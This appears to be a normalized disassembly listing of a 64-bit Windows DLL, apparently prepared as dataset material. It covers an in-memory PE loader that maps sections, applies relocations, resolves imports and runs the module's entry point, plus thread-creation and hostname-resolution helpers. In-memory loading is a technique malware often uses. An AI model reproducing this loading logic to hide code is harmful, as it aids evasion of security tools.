mov r8 rbx
xor edx edx
mov rcx rax
mov [ rdi - 0x8 ] eax
call sub_18000bd10
jmp r-xdata
mov eax [ rdi ]
test eax eax
jne r-xdata
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
sub_18001b0a0
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
mov r8 [ rcx ]
xor edi edi
mov rsi rcx
movzx eax [ r8 + 0x14 ]
cmp di [ r8 + 0x6 ]
jae r-xdata
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x40 ] rbp
lea rbp [ rw-data ]
lea rbx [ rax + r8 + 0x3c ]
nop [ rax + rax ] eax
movsxd rcx eax
movsxd rax edx
lea rdx [ rax + rcx * 2 ]
lea rcx [ r10 + rdx * 2 ]
mov r10d [ rbp + rcx * 4 ]
bt r9d 0x1a
jae r-xdata
mov edx [ rbx - 0x14 ]
mov ecx [ rbx - 0x1c ]
mov r8d 0x4000
call [ VirtualFree@IAT ]
jmp r-xdata
mov ecx [ rbx - 0x14 ]
mov eax ecx
test ecx ecx
jne r-xdata
bts r10d 0x9
mov r8 [ rsi ]
inc edi
add rbx 0x28
movzx eax [ r8 + 0x6 ]
cmp edi eax
jl r-xdata
test eax eax
je r-xdata
test r9b 0x40
je r-xdata
mov r9d [ rbx ]
mov eax r9d
mov edx r9d
mov r10d r9d
shr eax 0x1d
shr edx 0x1e
shr r10d 0x1f
and eax 0x1
and edx 0x1
bt r9d 0x19
jae r-xdata
mov rbp [ rsp + 0x40 ]
mov rbx [ rsp + 0x38 ]
mov rdx rcx
mov ecx [ rbx - 0x1c ]
lea r9 [ rsp + 0x30 ]
mov r8d r10d
call [ VirtualProtect@IAT ]
test r9b r9b
jns r-xdata
mov eax [ r8 + 0x20 ]
jmp r-xdata
mov eax [ r8 + 0x24 ]
sub_18001b1a0
mov [ rsp + 0x8 ] rbx
mov rax [ rcx ]
mov rbx [ rcx + 0x8 ]
mov r11 rdx
cmp [ rax + 0xb4 ] 0x0
jbe r-xdata
mov rbx [ rsp + 0x8 ]
retn
mov r8d [ rax + 0xb0 ]
add r8 rbx
mov eax [ r8 ]
test eax eax
je r-xdata
nop [ rax ] eax
mov eax [ r8 + 0x4 ]
add r8 rax
mov eax [ r8 ]
test eax eax
jne r-xdata
nop [ rax + rax ] ax
mov r10d eax
mov eax [ r8 + 0x4 ]
xor edx edx
sub eax 0x8
add r10 rbx
lea r9 [ r8 + 0x8 ]
test eax 0xfffffffe
jbe r-xdata
movsxd rax ecx
add [ rax + r10 ] r11
cmp eax 0xa
jne r-xdata
movzx eax [ r9 ]
mov ecx eax
shr eax 0xc
and ecx 0xfff
cmp eax 0x3
je r-xdata
mov eax [ r8 + 0x4 ]
inc edx
add r9 0x2
sub eax 0x8
shr eax 0x1
cmp edx eax
jb r-xdata
sub_18001b240
push r12
push r13
sub rsp 0x28
mov rax [ rcx ]
mov r12 [ rcx + 0x8 ]
mov r13 rcx
cmp [ rax + 0x94 ] 0x0
jbe r-xdata
mov eax 0x1
add rsp 0x28
pop r13
pop r12
retn
mov [ rsp + 0x50 ] rsi
mov esi [ rax + 0x90 ]
mov edx 0x14
add rsi r12
mov rcx rsi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
mov rsi [ rsp + 0x50 ]
add rsp 0x28
pop r13
pop r12
retn
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x20 ] r14
mov r14 0x8000000000000000
mov eax 0x1
lea rcx [ r12 + rax ]
call [ LoadLibraryA@IAT ]
mov rbp rax
cmp rax 0xffffffffffffffff
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ r13 + 0x18 ]
inc ecx
movsxd rdx ecx
mov rcx [ r13 + 0x10 ]
shl rdx 0x3
call sub_18000c1a8
mov [ r13 + 0x10 ] rax
test rax rax
je r-xdata
mov rdi [ rsp + 0x58 ]
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov r14 [ rsp + 0x20 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x28
pop r13
pop r12
retn
movsxd rcx [ r13 + 0x18 ]
mov [ rax + rcx * 8 ] rbp
inc [ r13 + 0x18 ]
mov eax [ rsi ]
test eax eax
je r-xdata
mov ebx [ rsi + 0x10 ]
add rbx r12
mov rdi rbx
mov edi [ rsi + 0x10 ]
lea rbx [ r12 + rax ]
add rdi r12
jmp r-xdata
add rsi 0x14
mov edx 0x14
mov rcx rsi
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
sub rdi rbx
nop [ rax + rax ] eax
mov rax [ rbx ]
test rax rax
je r-xdata
mov eax [ rsi + 0xc ]
test eax eax
je r-xdata
call [ GetProcAddress@IAT ]
mov [ rdi + rbx ] rax
test rax rax
je r-xdata
lea rdx [ rax + r12 + 0x2 ]
mov rax [ rbx + 0x8 ]
add rbx 0x8
test rax rax
jne r-xdata
mov rcx rbp
movzx edx ax
test r14 rax
jne r-xdata
sub_18001b3c0
push r13
sub rsp 0x30
mov r13 rdx
test rcx rcx
jne r-xdata
mov rax [ rcx ]
mov [ rsp + 0x20 ] r12
mov r12 [ rcx + 0x8 ]
cmp [ rax + 0x8c ] 0x0
jne r-xdata
xor eax eax
add rsp 0x30
pop r13
retn
mov [ rsp + 0x40 ] rbx
mov ebx [ rax + 0x88 ]
add rbx r12
mov eax [ rbx + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov r12 [ rsp + 0x20 ]
add rsp 0x30
pop r13
retn
mov rbx [ rsp + 0x40 ]
mov r12 [ rsp + 0x20 ]
xor eax eax
add rsp 0x30
pop r13
retn
cmp [ rbx + 0x14 ] 0x0
je r-xdata
mov [ rsp + 0x48 ] rbp
mov ebp [ rbx + 0x24 ]
mov [ rsp + 0x50 ] rsi
mov esi [ rbx + 0x20 ]
mov [ rsp + 0x28 ] rdi
add rbp r12
add rsi r12
xor edi edi
test eax eax
je r-xdata
xor eax eax
nop
movzx ecx [ rbp ]
cmp ecx 0xffffffff
je r-xdata
inc edi
add rsi 0x4
add rbp 0x2
cmp edi [ rbx + 0x18 ]
jb r-xdata
cmp ecx [ rbx + 0x14 ]
ja r-xdata
mov edx [ rsi ]
mov rcx r13
add rdx r12
call sub_1800117c0
test eax eax
je r-xdata
mov eax [ rbx + 0x1c ]
lea ecx [ rax + rcx * 4 ]
mov eax [ rcx + r12 ]
add rax r12
jmp r-xdata
mov rdi [ rsp + 0x28 ]
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
mov r12 [ rsp + 0x20 ]
add rsp 0x30
pop r13
retn
sub_18001b4c0
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov [ rsp + 0x30 ] rsi
xor esi esi
mov rbx rcx
cmp [ rcx + 0x1c ] esi
je r-xdata
cmp [ rbx + 0x10 ] rsi
je r-xdata
mov rax [ rbx ]
mov rcx [ rcx + 0x8 ]
xor r8d r8d
mov r9d [ rax + 0x28 ]
xor edx edx
add r9 rcx
call r9
mov [ rbx + 0x1c ] esi
mov rcx [ rbx + 0x8 ]
mov rsi [ rsp + 0x30 ]
test rcx rcx
je r-xdata
cmp [ rbx + 0x18 ] esi
jle r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
add rsp 0x20
pop rbx
xor edx edx
mov r8d 0x8000
call [ VirtualFree@IAT ]
mov rcx [ rbx + 0x10 ]
call sub_18000ec1c
mov [ rsp + 0x38 ] rdi
mov rdi rsi
nop [ rax ] eax
inc esi
add rdi 0x8
cmp esi [ rbx + 0x18 ]
jl r-xdata
mov rcx [ rcx + rdi ]
call [ FreeLibrary@IAT ]
mov rcx [ rbx + 0x10 ]
cmp [ rcx + rdi ] 0xffffffffffffffff
je r-xdata
mov rdi [ rsp + 0x38 ]
sub_18001b580
push r12
sub rsp 0x20
mov r12 rcx
test rcx rcx
jne r-xdata
mov [ rsp + 0x38 ] rbp
movsxd rbp [ rcx + 0x3c ]
mov r9d 0x40
add rbp rcx
mov r8d 0x2000
mov [ rsp + 0x40 ] rsi
mov edx [ rbp + 0x50 ]
mov rcx [ rbp + 0x30 ]
call [ VirtualAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
xor eax eax
add rsp 0x20
pop r12
retn
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x48 ] rdi
call [ GetProcessHeap@IAT ]
xor edx edx
mov rcx rax
lea r8d [ rdx + 0x20 ]
call [ HeapAlloc@IAT ]
mov r8d 0x1000
mov rcx rsi
mov rdi rax
mov [ rax + 0x8 ] rsi
xor eax eax
mov [ rdi + 0x10 ] rax
mov [ rdi + 0x18 ] rax
mov edx [ rbp + 0x50 ]
lea r9d [ rax + 0x40 ]
call [ VirtualAlloc@IAT ]
mov edx [ rbp + 0x54 ]
mov r9d 0x40
mov r8d 0x1000
mov rcx rsi
call [ VirtualAlloc@IAT ]
mov r8d [ rbp + 0x54 ]
mov rdx r12
add r8d [ r12 + 0x3c ]
mov rcx rax
mov rbx rax
call sub_18000c440
movsxd rax [ r12 + 0x3c ]
mov r8 rdi
add rax rbx
mov rdx rbp
mov rcx r12
mov [ rdi ] rax
mov [ rax + 0x30 ] rsi
call sub_18001afa0
mov rbx [ rsp + 0x30 ]
mov rdx rsi
sub rdx [ rbp + 0x30 ]
je r-xdata
mov edx [ rbp + 0x50 ]
lea r9d [ rax + 0x40 ]
xor ecx ecx
mov r8d 0x2000
call [ VirtualAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
mov rcx rdi
call sub_18001b240
test eax eax
je r-xdata
mov rcx rdi
call sub_18001b1a0
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
mov rcx rdi
call sub_18001b4c0
xor eax eax
mov rcx rdi
call sub_18001b0a0
mov r11 [ rdi ]
mov eax [ r11 + 0x28 ]
test eax eax
je r-xdata
mov rax rdi
jmp r-xdata
add rax rsi
je r-xdata
mov rdi [ rsp + 0x48 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
xor r8d r8d
mov rcx rsi
lea edx [ r8 + 0x1 ]
call rax
test eax eax
je r-xdata
mov [ rdi + 0x1c ] 0x1
sub_18001b72c
push rbp
push r12
push r13
sub rsp 0x60
lea rbp [ rsp + 0x50 ]
mov [ rbp + 0x30 ] rbx
mov [ rbp + 0x38 ] rsi
mov [ rbp + 0x40 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp ] rax
mov r12 r8
mov rsi rdx
mov rbx rcx
test rcx rcx
jne r-xdata
call sub_180011808
cmp rax rsi
jb r-xdata
call sub_18000ea3c
mov ebx 0x16
mov rax [ r12 ]
mov edx [ rax + 0x14 ]
test edx edx
je r-xdata
mov [ rbx ] 0x0
jmp r-xdata
mov eax ebx
cmp [ rbx ] 0x0
jne r-xdata
mov eax [ rax + 0x4 ]
mov [ rsp + 0x40 ] 0x1
mov r9 rbx
mov [ rsp + 0x38 ] eax
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
or [ rsp + 0x20 ] 0xffffffff
mov r8d 0x100
mov rcx r12
call sub_180011614
movsxd r13 eax
test eax eax
jne r-xdata
mov al [ rbx ]
cmp al 0x41
jl r-xdata
xor eax eax
jmp r-xdata
mov rcx r13
cmp rsi r13
jae r-xdata
call sub_18000ea3c
mov ebx 0x2a
mov [ rax ] ebx
inc rbx
cmp al 0x5a
jg r-xdata
mov rcx [ rbp ]
xor rcx rbp
call sub_18000c060
mov rbx [ rbp + 0x30 ]
mov rsi [ rbp + 0x38 ]
mov rdi [ rbp + 0x40 ]
lea rsp [ rbp + 0x10 ]
pop r13
pop r12
pop rbp
retn
test eax eax
jle r-xdata
mov [ rbx ] 0x0
call sub_18000ea3c
mov ebx 0x22
jmp r-xdata
add al 0x20
mov [ rbx ] al
xor edi edi
xor edx edx
lea rax [ rdx - 0x20 ]
div rcx
cmp rax 0x1
jb r-xdata
mov [ rax ] ebx
call sub_18000e9d4
jmp r-xdata
mov rcx [ r12 ]
mov [ rsp + 0x40 ] 0x1
mov r9 rbx
mov eax [ rcx + 0x4 ]
mov edx [ rcx + 0x14 ]
mov r8d 0x100
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] r13d
mov rcx r12
mov [ rsp + 0x28 ] rdi
or [ rsp + 0x20 ] 0xffffffff
call sub_180011614
test eax eax
je r-xdata
call sub_18000ea3c
mov [ rax ] 0xc
jmp r-xdata
add rcx 0x10
cmp rcx 0x400
ja r-xdata
call sub_18000ea3c
mov ebx 0x2a
mov [ rax ] ebx
mov r8 rdi
mov rdx rsi
mov rcx rbx
call sub_180011824
mov ebx eax
jmp r-xdata
call sub_18000ea3c
mov eax [ rax ]
jmp r-xdata
call sub_18000c27c
mov rdi rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
call sub_18000ec1c
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
test rdi rdi
jne r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_18000d8d0
sub rsp rax
lea rdi [ rsp + 0x50 ]
test rdi rdi
je r-xdata
mov rax 0xffffffffffffff0
mov [ rdi ] 0xcccc
jmp r-xdata
add rdi 0x10
jmp r-xdata
sub_18001b928
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x40
mov rdi rcx
mov rbx rdx
lea rcx [ rsp + 0x20 ]
mov rdx r8
call sub_18000cd7c
lea r8 [ rsp + 0x20 ]
mov rdx rbx
mov rcx rdi
call sub_18001b72c
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18001b974
push rbx
sub rsp 0x20
xor edx edx
mov rbx rcx
cmp [ rw-data ] edx
jne r-xdata
xor r8d r8d
or rdx 0xffffffffffffffff
call sub_18001b928
test rcx rcx
jne r-xdata
mov rax rcx
cmp [ rcx ] dl
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
xor eax eax
jmp r-xdata
mov rax rbx
mov cl [ rax ]
cmp cl 0x41
jl r-xdata
add rsp 0x20
pop rbx
retn
inc rax
cmp [ rax ] dl
jne r-xdata
cmp cl 0x5a
jg r-xdata
jmp r-xdata
add cl 0x20
mov [ rax ] cl
sub_18001ba28
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18000f3a0
call sub_18000f398
mov ecx eax
call FlsGetValue
mov r11 rax
test rax rax
jne r-xdata
mov rax [ rbx + 0x90 ]
mov rcx rbx
mov [ r11 + 0x90 ] rax
mov rax [ rbx + 0x98 ]
mov [ r11 + 0x98 ] rax
mov rax [ rbx + 0x8 ]
mov [ r11 + 0x8 ] rax
call sub_18000f534
call sub_18000f398
mov rdx rbx
mov ecx eax
call FlsSetValue
test eax eax
jne r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ rbx ] eax
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx eax
call [ ExitThread@IAT ]
call sub_18001b9fc
sub_18001baa8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x30
xor ebx ebx
mov rbp r9
mov rsi r8
mov r12d edx
mov r13 rcx
test r8 r8
jne r-xdata
call sub_18000f3a0
mov edx 0x2c8
mov ecx 0x1
call sub_18000f7ac
mov rdi rax
test rax rax
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
jmp r-xdata
mov rcx rdi
call sub_18000ec1c
test ebx ebx
je r-xdata
call sub_18000f510
mov rcx rdi
mov rdx [ rax + 0xc0 ]
call sub_18000f3d4
mov rcx [ rsp + 0x78 ]
or [ rdi + 0x8 ] 0xffffffffffffffff
mov eax [ rsp + 0x70 ]
test rcx rcx
lea r8 [ rsp + 0x60 ]
cmovne r8 rcx
mov rdx r12
mov r9 rdi
mov [ rsp + 0x28 ] r8
lea r8 [ sub_18001ba28 ]
mov rcx r13
mov [ rdi + 0x90 ] rsi
mov [ rdi + 0x98 ] rbp
mov [ rsp + 0x20 ] eax
call [ CreateThread@IAT ]
test rax rax
jne r-xdata
xor eax eax
mov ecx ebx
call sub_18000ea7c
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
call [ GetLastError@IAT ]
mov ebx eax
sub_18001bba0
push rbx
sub rsp 0x20
xor eax eax
mov rbx rcx
test rcx rcx
je r-xdata
add rsp 0x20
pop rbx
retn
or rcx 0xffffffffffffffff
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x38 ] rdi
mov rdi rbx
[ rdi ]
not rcx
mov rdx rcx
lea rsi [ rcx - 0x1 ]
lea ecx [ rax + 0x1 ]
call sub_18001fbec
mov rdi rax
test rax rax
jne r-xdata
lea rdx [ rsi + 0x1 ]
mov r8 rbx
mov rcx rax
call sub_180011824
mov rsi [ rsp + 0x30 ]
mov rax rdi
mov rdi [ rsp + 0x38 ]
mov rsi [ rsp + 0x30 ]
mov rdi [ rsp + 0x38 ]
add rsp 0x20
pop rbx
retn
sub_18001bc10
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov ebp edx
mov edx 0x30
mov r12d ecx
lea ecx [ rdx - 0x2f ]
mov edi r9d
movzx esi r8w
call sub_18001fbec
mov rbx rax
test rax rax
je r-xdata
xor eax eax
jmp r-xdata
mov edx 0x10
lea ecx [ rdx - 0xf ]
call sub_18001fbec
test rax rax
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov ecx 0x2
mov [ rax + 0x2 ] si
mov [ rax + 0x4 ] edi
mov [ rbx + 0x20 ] rax
mov [ rax ] cx
mov [ rbx + 0x8 ] r12d
mov rax rbx
mov [ rbx + 0x4 ] ecx
mov [ rbx + 0xc ] ebp
mov [ rbx + 0x10 ] 0x10
mov rcx rbx
call sub_18000ec1c
sub_18001bcb0
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov rdi [ rsp + 0x68 ]
mov r14 [ rsp + 0x60 ]
movzx ebp r9w
mov [ rdi ] 0x0
mov r12d r8d
mov r13d edx
mov [ r14 ] 0x0
call [ gethostbyname@IAT ]
mov rsi rax
test rax rax
je r-xdata
call [ WSAGetLastError@IAT ]
sub eax 0x2af9
je r-xdata
cmp [ rax + 0x10 ] 0x2
mov [ rsp + 0x40 ] rbx
jne r-xdata
mov eax 0x2af9
jmp r-xdata
dec eax
je r-xdata
mov r8 [ rsi ]
mov r9d 0x400
mov rcx r14
lea edx [ r9 + 0x1 ]
call sub_180016710
xor eax eax
cmp [ rax + 0x12 ] 0x4
jne r-xdata
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov eax 0x2afa
jmp r-xdata
dec eax
je r-xdata
mov rbx [ rax + 0x14 ]
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov eax 0x2afb
jmp r-xdata
dec eax
nop [ rax ] eax
mov eax 0x8
jmp r-xdata
mov rcx [ rbx + 0x8 ]
add rbx 0x8
lea rdi [ rax + 0x28 ]
test rcx rcx
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov r9d [ rcx ]
movzx r8d bp
mov edx r12d
mov ecx r13d
call sub_18001bc10
mov [ rdi ] rax
test rax rax
je r-xdata
sub_18001bdc0
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x878
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x860 ] rax
mov r12 [ rsp + 0x8e8 ]
mov r13 rcx
mov r15d r8d
mov r14d edx
lea rcx [ rsp + 0x41 ]
xor esi esi
mov r8d 0x400
xor edx edx
movzx edi r9w
mov [ rsp + 0x30 ] r9w
mov [ rsp + 0x40 ] sil
call sub_18000bd10
lea rcx [ rsp + 0x451 ]
xor edx edx
mov r8d 0x400
mov [ rsp + 0x450 ] sil
call sub_18000bd10
mov r9d 0x400
lea rcx [ rsp + 0x40 ]
lea edx [ r9 + 0x1 ]
mov r8 r13
lea rbp [ rsp + 0x40 ]
lea rbx [ rsp + 0x450 ]
call sub_180016710
lea rax [ rsp + 0x450 ]
movzx r9d di
mov r8d r15d
mov edx r14d
mov rcx r13
mov [ rsp + 0x28 ] r12
mov [ rsp + 0x20 ] rax
call sub_18001bcb0
mov edi eax
test eax eax
jne r-xdata
mov rcx [ rsp + 0x860 ]
xor rcx rsp
call sub_18000c060
add rsp 0x878
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
nop [ rax ] eax
test edi edi
jne r-xdata
or rcx 0xffffffffffffffff
xor eax eax
mov rdi rbx
[ rdi ]
not rcx
dec rcx
je r-xdata
mov eax edi
cmp [ rsp + 0x8e0 ] edi
je r-xdata
mov eax 0x2afb
jmp r-xdata
mov rdi rbx
mov rax rbp
sub rdi rbp
mov rcx rbx
call sub_18001bba0
mov rcx [ r12 ]
mov [ rcx + 0x18 ] rax
mov rcx [ r12 ]
mov eax 0x8
cmp [ rcx + 0x18 ] 0x0
cmove edi eax
test edx edx
je r-xdata
inc rax
test ecx ecx
jne r-xdata
inc esi
cmp esi 0x10
je r-xdata
movzx edx [ rax ]
movzx ecx [ rax + rdi ]
sub edx ecx
jne r-xdata
movzx r9d [ rsp + 0x30 ]
mov rax rbp
mov r8d r15d
mov edx r14d
mov rcx r13
mov rbp rbx
mov [ rsp + 0x28 ] r12
mov [ rsp + 0x20 ] rax
mov rbx rax
call sub_18001bcb0
mov edi eax
test eax eax
je r-xdata
cmp [ r12 ] 0x0
jne r-xdata
jmp r-xdata
sub_18001bf60
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
mov rdi rdx
movzx r12d cx
test rdx rdx
je r-xdata
xor eax eax
mov r13d 0x2
nop [ rax + rax ] ax
mov eax 0x8
jmp r-xdata
mov edx 0x10
lea ecx [ rdx - 0xf ]
call sub_18001fbec
test rax rax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
mov rcx rbx
call sub_18000ec1c
mov [ rax ] r13w
mov [ rax + 0x2 ] r12w
mov [ rax + 0x4 ] esi
mov [ rbx + 0x4 ] r13d
mov [ rbx + 0x8 ] r13d
mov [ rbx + 0xc ] ebp
mov [ rbx + 0x10 ] 0x10
mov [ rbx + 0x20 ] rax
mov rax [ rdi + 0x28 ]
mov [ rbx + 0x28 ] rax
mov [ rdi + 0x28 ] rbx
mov rdi [ rbx + 0x28 ]
test rdi rdi
jne r-xdata
mov rax [ rdi + 0x20 ]
mov ebp [ rdi + 0xc ]
mov edx 0x30
mov esi [ rax + 0x4 ]
lea ecx [ rdx - 0x2f ]
call sub_18001fbec
mov rbx rax
test rax rax
je r-xdata
sub_18001c030
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rdi rcx
mov rcx [ rbx + 0x20 ]
test rcx rcx
je r-xdata
call sub_18000ec1c
mov rbx [ rbx + 0x28 ]
mov rcx rdi
call sub_18000ec1c
mov rdi rbx
test rbx rbx
jne r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_18001c090
mov [ rsp + 0x10 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov rsi rdx
xor edx edx
mov r13 r9
movzx eax dx
mov r15 rcx
mov ebx edx
mov r14d edx
mov edi edx
mov [ rsp + 0x30 ] edx
mov [ rsp + 0x98 ] eax
mov [ rsp + 0x38 ] rdx
mov r12d edx
movzx ebp dx
mov [ rsp + 0x80 ] dx
mov [ r9 ] rdx
test rcx rcx
jne r-xdata
test r8 r8
je r-xdata
test rsi rsi
jne r-xdata
test rsi rsi
je r-xdata
cmp [ r8 + 0x10 ] rdx
jne r-xdata
mov eax 0x2af9
jmp r-xdata
mov ebp [ rsp + 0x98 ]
lea rdx [ rsp + 0x38 ]
mov r8d 0xa
mov rcx rsi
call sub_1800166dc
mov ecx eax
mov [ rsp + 0x98 ] eax
mov rax [ rsp + 0x38 ]
cmp [ rax ] bl
jne r-xdata
mov eax 0x2afb
jmp r-xdata
cmp [ r8 + 0x18 ] rdx
jne r-xdata
mov rbx [ rsp + 0x88 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
test r14b 0x1
mov ecx 0x7f000001
cmovne ecx edx
call [ htonl@IAT ]
mov esi eax
movzx eax [ r15 ]
mov rcx r15
test al al
je r-xdata
test edi edi
je r-xdata
call [ htons@IAT ]
xor edx edx
mov [ rsp + 0x80 ] ax
movzx ebp ax
test edi edi
jne r-xdata
cmp [ r8 + 0x20 ] rdx
jne r-xdata
test r15 r15
je r-xdata
mov ebx 0x8
jmp r-xdata
test r14b 0x4
je r-xdata
cmp al 0x2e
jne r-xdata
lea rdx [ r--data ]
mov rcx rsi
call [ getservbyname@IAT ]
test rax rax
je r-xdata
cmp edi 0x2
jne r-xdata
test r15 r15
je r-xdata
mov r12d 0x1
mov edi r12d
jmp r-xdata
cmp [ r8 + 0x28 ] rdx
jne r-xdata
test r12d r12d
je r-xdata
or [ rax ] 0x4
test r14b 0x2
je r-xdata
mov rcx [ r13 ]
call sub_18001c030
mov [ r13 ] 0x0
mov r8d [ rsp + 0x30 ]
and r14d 0x2
movzx r9d bp
mov edx edi
mov rcx r15
mov [ rsp + 0x28 ] r13
mov [ rsp + 0x20 ] r14d
call sub_18001bdc0
mov ebx eax
test eax eax
jne r-xdata
mov ebx 0x2af9
jmp r-xdata
movzx eax [ rcx + 0x1 ]
inc rcx
test al al
jne r-xdata
inc edx
test edi edi
je r-xdata
movzx eax [ rax + 0x18 ]
mov [ rsp + 0x80 ] ax
mov [ rsp + 0x98 ] ax
mov r14d [ r8 ]
test r14b 0x2
je r-xdata
mov eax ebx
mov rdx [ r13 ]
movzx ecx [ rsp + 0x80 ]
call sub_18001bf60
mov ebx eax
test eax eax
je r-xdata
mov ecx esi
call [ inet_ntoa@IAT ]
mov rcx rax
call sub_18001bba0
mov rcx [ r13 ]
mov [ rcx + 0x18 ] rax
mov rax [ r13 ]
cmp [ rax + 0x18 ] rbx
je r-xdata
jmp r-xdata
cmp edx 0x3
jne r-xdata
lea rdx [ r--data ]
mov rcx rsi
call [ getservbyname@IAT ]
test rax rax
je r-xdata
cmp edi 0x1
jne r-xdata
mov eax [ r8 + 0x4 ]
test eax eax
je r-xdata
test rcx rcx
jne r-xdata
mov rcx r15
call [ inet_addr@IAT ]
mov esi eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ rsp + 0x98 ]
movzx ebp [ rax + 0x18 ]
movzx eax bp
mov [ rsp + 0x98 ] eax
jmp r-xdata
mov edi [ r8 + 0x8 ]
test edi edi
je r-xdata
cmp eax 0x2
je r-xdata
mov eax 0x2726
jmp r-xdata
mov edx [ rsp + 0x30 ]
mov r9d esi
movzx r8d bp
mov ecx edi
call sub_18001bc10
mov [ r13 ] rax
test rax rax
jne r-xdata
test edi edi
jne r-xdata
mov ebx 0x2af9
mov eax 0x277d
test edi edi
cmovne ebx eax
jmp r-xdata
test ax ax
jne r-xdata
mov eax [ r8 + 0xc ]
mov [ rsp + 0x30 ] eax
cmp edi 0x1
je r-xdata
mov eax 0x273f
jmp r-xdata
xor edx edx
movzx eax bp
neg ax
sbb edi edi
add edi 0x2
test bp bp
je r-xdata
cmp edi 0x2
je r-xdata
cmp [ rsp + 0x80 ] bx
je r-xdata
cmp edi 0x3
je r-xdata
mov r12d 0x1
mov eax 0x273c
jmp r-xdata
sub_18001c3b0
push rsi
push r12
push r13
push r14
push r15
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x38 ] rax
mov eax [ r--data ]
mov r14 [ rsp + 0xa0 ]
mov esi [ rsp + 0xb0 ]
mov [ rsp + 0x30 ] eax
movzx eax [ r--data ]
mov r12 r9
mov [ rsp + 0x34 ] ax
lea rax [ rsp + 0x30 ]
mov r15 r8
mov r13 rcx
mov [ rsp + 0x28 ] rax
test rcx rcx
je r-xdata
mov eax 0x2afb
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov rcx [ rsp + 0x38 ]
xor rcx rsp
call sub_18000c060
add rsp 0x50
pop r15
pop r14
pop r13
pop r12
pop rsi
retn
cmp [ rcx ] 0x2
je r-xdata
mov [ rsp + 0x88 ] rbx
mov rbx [ rsp + 0xa8 ]
test r8 r8
je r-xdata
mov eax 0x273f
jmp r-xdata
test r14 r14
je r-xdata
test r9 r9
